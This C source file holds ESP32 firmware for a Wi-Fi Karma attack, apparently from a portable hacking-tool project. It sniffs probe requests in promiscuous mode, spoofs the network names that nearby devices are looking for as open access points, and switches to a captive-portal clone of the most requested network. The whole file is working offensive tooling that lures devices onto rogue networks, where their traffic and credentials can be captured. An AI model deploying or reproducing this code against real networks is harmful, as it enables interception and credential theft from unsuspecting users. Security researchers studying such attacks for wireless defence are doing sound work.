// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM

#include "poom_wifi_karma.h"

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "poom_wifi_captive.h"
#include "poom_wifi_ctrl.h"

#define POOM_WIFI_KARMA_MAX_SSIDS         (32)
#define POOM_WIFI_KARMA_MAX_SSID_LEN      (32)
#define POOM_WIFI_KARMA_MIN_SSID_LEN      (4)
#define POOM_WIFI_KARMA_AP_ROTATE_MS      (10000)
#define POOM_WIFI_KARMA_PROMOTE_MIN_HITS  (6)
#define POOM_WIFI_KARMA_PROMOTE_RATIO_PCT (60)
#define POOM_WIFI_KARMA_SINGLE_MIN_HITS   (3)

#if CONFIG_POOM_WIFI_KARMA_ENABLE_LOG
    static const char *POOM_WIFI_KARMA_TAG = "poom_wifi_karma";

    #define POOM_PRINTF_E(fmt, ...) \
        printf("[E] [%s] %s:%d: " fmt "\n", POOM_WIFI_KARMA_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_W(fmt, ...) \
        printf("[W] [%s] %s:%d: " fmt "\n", POOM_WIFI_KARMA_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_I(fmt, ...) \
        printf("[I] [%s] %s:%d: " fmt "\n", POOM_WIFI_KARMA_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_D(fmt, ...) \
        printf("[D] [%s] %s:%d: " fmt "\n", POOM_WIFI_KARMA_TAG, __func__, __LINE__, ##__VA_ARGS__)

#else

    #define POOM_PRINTF_E(...)
    #define POOM_PRINTF_W(...)
    #define POOM_PRINTF_I(...)
    #define POOM_PRINTF_D(...)

#endif

static char s_poom_wifi_karma_ssid_cache[POOM_WIFI_KARMA_MAX_SSIDS][POOM_WIFI_KARMA_MAX_SSID_LEN + 1];
static uint16_t s_poom_wifi_karma_ssid_hits[POOM_WIFI_KARMA_MAX_SSIDS];
static char s_poom_wifi_karma_active_ssid[POOM_WIFI_KARMA_MAX_SSID_LEN + 1];
static int s_poom_wifi_karma_ssid_count = 0;
static int s_poom_wifi_karma_ssid_index = 0;
static uint32_t s_poom_wifi_karma_last_ap_switch_ms = 0;
static uint32_t s_poom_wifi_karma_total_hits = 0;
static bool s_poom_wifi_karma_running = false;
static bool s_poom_wifi_karma_captive_mode = false;

static TaskHandle_t s_poom_wifi_karma_main_task_handle = NULL;

/**
 * @brief Adds or updates one SSID hit counter in local cache.
 * @param[in] ssid SSID string to add.
 * @return bool
 */
static bool poom_wifi_karma_add_ssid_to_cache_(const char *ssid)
{
    int index;

    if(ssid == NULL)
    {
        return false;
    }

    for(index = 0; index < s_poom_wifi_karma_ssid_count; index++)
    {
        if(strcmp(s_poom_wifi_karma_ssid_cache[index], ssid) == 0)
        {
            if(s_poom_wifi_karma_ssid_hits[index] < UINT16_MAX)
            {
                s_poom_wifi_karma_ssid_hits[index]++;
            }
            s_poom_wifi_karma_total_hits++;
            return false;
        }
    }

    if(s_poom_wifi_karma_ssid_count >= POOM_WIFI_KARMA_MAX_SSIDS)
    {
        return false;
    }

    strncpy(s_poom_wifi_karma_ssid_cache[s_poom_wifi_karma_ssid_count], ssid, POOM_WIFI_KARMA_MAX_SSID_LEN);
    s_poom_wifi_karma_ssid_cache[s_poom_wifi_karma_ssid_count][POOM_WIFI_KARMA_MAX_SSID_LEN] = '\0';
    s_poom_wifi_karma_ssid_hits[s_poom_wifi_karma_ssid_count] = 1;
    s_poom_wifi_karma_total_hits++;
    s_poom_wifi_karma_ssid_count++;
    return true;
}

/**
 * @brief Finds the most requested SSID index and hit count.
 * @param[out] out_index Output index in cache.
 * @param[out] out_hits Output hit counter.
 * @return bool
 */
static bool poom_wifi_karma_get_top_ssid_(int *out_index, uint16_t *out_hits)
{
    int index;
    int top_index = -1;
    uint16_t top_hits = 0;

    if((s_poom_wifi_karma_ssid_count <= 0) || (out_index == NULL) || (out_hits == NULL))
    {
        return false;
    }

    for(index = 0; index < s_poom_wifi_karma_ssid_count; index++)
    {
        if(s_poom_wifi_karma_ssid_hits[index] > top_hits)
        {
            top_hits = s_poom_wifi_karma_ssid_hits[index];
            top_index = index;
        }
    }

    if(top_index < 0)
    {
        return false;
    }

    *out_index = top_index;
    *out_hits = top_hits;
    return true;
}

/**
 * @brief Determines if captured traffic should promote to captive clone mode.
 * @param[out] out_index Selected SSID index for promotion.
 * @return bool
 */
static bool poom_wifi_karma_should_promote_to_captive_(int *out_index)
{
    int top_index = -1;
    uint16_t top_hits = 0;
    uint32_t ratio = 0;

    if((out_index == NULL) || s_poom_wifi_karma_captive_mode)
    {
        return false;
    }

    if(!poom_wifi_karma_get_top_ssid_(&top_index, &top_hits))
    {
        return false;
    }

    if((s_poom_wifi_karma_ssid_count == 1) && (top_hits >= POOM_WIFI_KARMA_SINGLE_MIN_HITS))
    {
        *out_index = top_index;
        return true;
    }

    if((top_hits < POOM_WIFI_KARMA_PROMOTE_MIN_HITS) || (s_poom_wifi_karma_total_hits == 0U))
    {
        return false;
    }

    ratio = ((uint32_t)top_hits * 100U) / s_poom_wifi_karma_total_hits;
    if(ratio >= POOM_WIFI_KARMA_PROMOTE_RATIO_PCT)
    {
        *out_index = top_index;
        return true;
    }

    return false;
}

/**
 * @brief Switches runtime from rotating AP mode to captive clone mode.
 * @param[in] ssid Target SSID for clone AP.
 * @return void
 */
static void poom_wifi_karma_promote_to_captive_(const char *ssid)
{
    if((ssid == NULL) || (ssid[0] == '\0') || s_poom_wifi_karma_captive_mode)
    {
        return;
    }

    (void)poom_wifi_ctrl_set_promiscuous(false);
    (void)poom_wifi_ctrl_set_promiscuous_rx_cb(NULL);

    poom_wifi_captive_set_ap_clone(ssid, true);
    poom_wifi_captive_start();
    strncpy(s_poom_wifi_karma_active_ssid, ssid, sizeof(s_poom_wifi_karma_active_ssid) - 1U);
    s_poom_wifi_karma_active_ssid[sizeof(s_poom_wifi_karma_active_ssid) - 1U] = '\0';

    s_poom_wifi_karma_captive_mode = true;
    POOM_PRINTF_W("Promoted to captive clone mode for SSID: %s", ssid);
}

/**
 * @brief Wi-Fi promiscuous callback extracting SSIDs from probe request packets.
 * @param[in,out] buffer Packet buffer from Wi-Fi driver.
 * @param[in] packet_type Promiscuous packet type.
 * @return void
 */
static void poom_wifi_karma_probe_request_cb_(void *buffer, wifi_promiscuous_pkt_type_t packet_type)
{
    const wifi_promiscuous_pkt_t *packet;
    const uint8_t *payload;
    int payload_length;

    if((buffer == NULL) || (packet_type != WIFI_PKT_MGMT))
    {
        return;
    }

    packet = (const wifi_promiscuous_pkt_t *)buffer;
    if(packet->rx_ctrl.sig_len <= 26)
    {
        return;
    }

    payload = packet->payload + 24;
    payload_length = packet->rx_ctrl.sig_len - 24;
    if((payload_length <= 2) || (payload[0] != 0x00))
    {
        return;
    }

    {
        int ssid_len = payload[1];

        if((ssid_len >= POOM_WIFI_KARMA_MIN_SSID_LEN) && (ssid_len <= POOM_WIFI_KARMA_MAX_SSID_LEN))
        {
            char ssid[POOM_WIFI_KARMA_MAX_SSID_LEN + 1] = {0};
            memcpy(ssid, payload + 2, (size_t)ssid_len);

            if(poom_wifi_karma_add_ssid_to_cache_(ssid))
            {
                POOM_PRINTF_I("New target SSID discovered: %s", ssid);
            }
        }
    }
}

/**
 * @brief Main runtime task rotating spoofed AP SSIDs and promoting to captive mode.
 * @param[in,out] task_arg Task argument (unused).
 * @return void
 */
static void poom_wifi_karma_task_(void *task_arg)
{
    esp_err_t status;

    (void)task_arg;

    status = poom_wifi_ctrl_set_promiscuous(true);
    if(status != ESP_OK)
    {
        POOM_PRINTF_W("poom_wifi_ctrl_set_promiscuous(true) failed: %s", esp_err_to_name(status));
    }

    status = poom_wifi_ctrl_set_promiscuous_rx_cb(poom_wifi_karma_probe_request_cb_);
    if(status != ESP_OK)
    {
        POOM_PRINTF_W("poom_wifi_ctrl_set_promiscuous_rx_cb failed: %s", esp_err_to_name(status));
    }

    while(s_poom_wifi_karma_running)
    {
        if(!s_poom_wifi_karma_captive_mode)
        {
            int promote_index = -1;

            if(poom_wifi_karma_should_promote_to_captive_(&promote_index))
            {
                poom_wifi_karma_promote_to_captive_(s_poom_wifi_karma_ssid_cache[promote_index]);
            }
        }

        if(s_poom_wifi_karma_captive_mode)
        {
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }

        if(s_poom_wifi_karma_ssid_count > 0)
        {
            uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000ULL);

            if((now_ms - s_poom_wifi_karma_last_ap_switch_ms) >= POOM_WIFI_KARMA_AP_ROTATE_MS)
            {
                wifi_config_t ap_config = {
                    .ap = {
                        .channel = 1,
                        .authmode = WIFI_AUTH_OPEN,
                        .max_connection = 4
                    }
                };

                (void)poom_wifi_ctrl_set_promiscuous(false);

                strncpy((char *)ap_config.ap.ssid,
                        s_poom_wifi_karma_ssid_cache[s_poom_wifi_karma_ssid_index],
                        POOM_WIFI_KARMA_MAX_SSID_LEN);
                ap_config.ap.ssid_len = (uint8_t)strlen(s_poom_wifi_karma_ssid_cache[s_poom_wifi_karma_ssid_index]);

                status = poom_wifi_ctrl_ap_start(&ap_config);
                if(status == ESP_OK)
                {
                    strncpy(s_poom_wifi_karma_active_ssid,
                            s_poom_wifi_karma_ssid_cache[s_poom_wifi_karma_ssid_index],
                            sizeof(s_poom_wifi_karma_active_ssid) - 1U);
                    s_poom_wifi_karma_active_ssid[sizeof(s_poom_wifi_karma_active_ssid) - 1U] = '\0';
                    POOM_PRINTF_W("Spoofing AP SSID: %s", s_poom_wifi_karma_ssid_cache[s_poom_wifi_karma_ssid_index]);
                }
                else
                {
                    POOM_PRINTF_E("poom_wifi_ctrl_ap_start failed: %s", esp_err_to_name(status));
                }

                s_poom_wifi_karma_ssid_index = (s_poom_wifi_karma_ssid_index + 1) % s_poom_wifi_karma_ssid_count;
                s_poom_wifi_karma_last_ap_switch_ms = now_ms;

                vTaskDelay(pdMS_TO_TICKS(100));
                (void)poom_wifi_ctrl_set_promiscuous(true);
            }
        }

        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    s_poom_wifi_karma_main_task_handle = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief Starts POOM Wi-Fi Karma runtime.
 * @param[in,out] none Not used.
 * @return esp_err_t
 */
esp_err_t poom_wifi_karma_start(void)
{
    esp_err_t status;

    if(s_poom_wifi_karma_running)
    {
        return ESP_OK;
    }

    status = poom_wifi_ctrl_init_apsta();
    if(status != ESP_OK)
    {
        POOM_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(status));
        return status;
    }

    s_poom_wifi_karma_ssid_count = 0;
    s_poom_wifi_karma_ssid_index = 0;
    s_poom_wifi_karma_last_ap_switch_ms = 0;
    s_poom_wifi_karma_total_hits = 0;
    s_poom_wifi_karma_captive_mode = false;
    memset(s_poom_wifi_karma_ssid_cache, 0, sizeof(s_poom_wifi_karma_ssid_cache));
    memset(s_poom_wifi_karma_ssid_hits, 0, sizeof(s_poom_wifi_karma_ssid_hits));
    s_poom_wifi_karma_active_ssid[0] = '\0';

    s_poom_wifi_karma_running = true;
    if(xTaskCreate(poom_wifi_karma_task_,
                   "poom_karma",
                   4096,
                   NULL,
                   5,
                   &s_poom_wifi_karma_main_task_handle) != pdPASS)
    {
        s_poom_wifi_karma_running = false;
        s_poom_wifi_karma_main_task_handle = NULL;
        POOM_PRINTF_E("Failed to create main task");
        return ESP_FAIL;
    }

    return ESP_OK;
}

/**
 * @brief Stops POOM Wi-Fi Karma runtime.
 * @param[in,out] none Not used.
 * @return esp_err_t
 */
esp_err_t poom_wifi_karma_stop(void)
{
    s_poom_wifi_karma_running = false;
    s_poom_wifi_karma_ssid_count = 0;
    s_poom_wifi_karma_ssid_index = 0;
    s_poom_wifi_karma_last_ap_switch_ms = 0;
    s_poom_wifi_karma_total_hits = 0;
    memset(s_poom_wifi_karma_ssid_cache, 0, sizeof(s_poom_wifi_karma_ssid_cache));
    memset(s_poom_wifi_karma_ssid_hits, 0, sizeof(s_poom_wifi_karma_ssid_hits));
    s_poom_wifi_karma_active_ssid[0] = '\0';

    (void)poom_wifi_ctrl_set_promiscuous(false);
    (void)poom_wifi_ctrl_set_promiscuous_rx_cb(NULL);

    if(s_poom_wifi_karma_captive_mode)
    {
        poom_wifi_captive_stop();
    }
    poom_wifi_captive_set_ap_clone(NULL, false);
    s_poom_wifi_karma_captive_mode = false;

    return ESP_OK;
}

/**
 * @brief Copies discovered SSIDs into caller-provided output array.
 * @param[out] destination_array Destination array of SSID strings.
 * @param[in] max_count Maximum number of entries to copy.
 * @return int
 */
int poom_wifi_karma_get_discovered_ssids(char destination_array[][POOM_WIFI_KARMA_MAX_SSID_LEN + 1], int max_count)
{
    int index;
    int copy_count;

    if((destination_array == NULL) || (max_count <= 0))
    {
        return 0;
    }

    copy_count = (s_poom_wifi_karma_ssid_count < max_count) ? s_poom_wifi_karma_ssid_count : max_count;

    for(index = 0; index < copy_count; index++)
    {
        strncpy(destination_array[index], s_poom_wifi_karma_ssid_cache[index], POOM_WIFI_KARMA_MAX_SSID_LEN);
        destination_array[index][POOM_WIFI_KARMA_MAX_SSID_LEN] = '\0';
    }

    return copy_count;
}

bool poom_wifi_karma_get_active_ssid(char *out_ssid, size_t out_len)
{
    if((out_ssid == NULL) || (out_len == 0U))
    {
        return false;
    }

    strncpy(out_ssid, s_poom_wifi_karma_active_ssid, out_len - 1U);
    out_ssid[out_len - 1U] = '\0';

    return (out_ssid[0] != '\0');
}

poom_wifi_karma_state_t poom_wifi_karma_get_state(void)
{
    if(!s_poom_wifi_karma_running)
    {
        return POOM_WIFI_KARMA_STATE_STOPPED;
    }

    if(s_poom_wifi_karma_captive_mode)
    {
        return POOM_WIFI_KARMA_STATE_CAPTIVE;
    }

    if(s_poom_wifi_karma_active_ssid[0] != '\0')
    {
        return POOM_WIFI_KARMA_STATE_CLONING;
    }

    return POOM_WIFI_KARMA_STATE_SCANNING;
}
